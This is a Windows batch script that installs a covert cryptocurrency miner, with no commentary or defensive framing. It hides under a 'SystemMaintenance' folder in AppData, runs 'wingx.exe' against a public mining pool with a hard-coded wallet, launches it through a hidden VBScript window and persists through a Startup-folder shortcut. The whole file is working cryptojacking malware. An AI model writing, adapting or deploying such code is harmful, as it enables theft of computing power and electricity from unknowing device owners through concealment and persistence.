@echo off
setlocal

:: Variables
set "scriptName=%~nx0"
set "installDir=%APPDATA%\SystemMaintenance"
set "startupDir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "shortcutName=SystemMaintenance.lnk"
set "miningCommand=wingx.exe --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RX1fGX5MB51g8XDGxxjFd7VLdfAVkncJrC"

:: Create install directory if it doesn't exist
if not exist "%installDir%" mkdir "%installDir%"

:: Copy script and wingx.exe to install directory
copy "%~f0" "%installDir%\%scriptName%" >nul
copy "wingx.exe" "%installDir%\wingx.exe" >nul

:: Create a new batch file to run the mining command
echo @echo off > "%installDir%\run_miner.bat"
echo :loop >> "%installDir%\run_miner.bat"
echo ping 8.8.8.8 -n 1 -w 1000 ^>nul >> "%installDir%\run_miner.bat"
echo if not errorlevel 1 goto start_mining >> "%installDir%\run_miner.bat"
echo timeout /t 5 /nobreak >nul >> "%installDir%\run_miner.bat"
echo goto loop >> "%installDir%\run_miner.bat"
echo :start_mining >> "%installDir%\run_miner.bat"
echo cd /d "%installDir%" >> "%installDir%\run_miner.bat"
echo "%installDir%\wingx.exe" %miningCommand% >> "%installDir%\run_miner.bat"
echo exit >> "%installDir%\run_miner.bat"

:: Create a VBScript to run the batch file hidden
echo Set WshShell = CreateObject("WScript.Shell") > "%installDir%\run_miner.vbs"
echo WshShell.Run chr(34) ^& "%installDir%\run_miner.bat" ^& chr(34), 0 >> "%installDir%\run_miner.vbs"
echo Set WshShell = Nothing >> "%installDir%\run_miner.vbs"

:: Create a shortcut in the Startup folder
if exist "%startupDir%\%shortcutName%" del "%startupDir%\%shortcutName%"
powershell -Command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%startupDir%\%shortcutName%'); $s.TargetPath='%installDir%\run_miner.vbs'; $s.Save()"

:: Run the miner immediately
cscript "%installDir%\run_miner.vbs"

:: Exit the installer script
exit
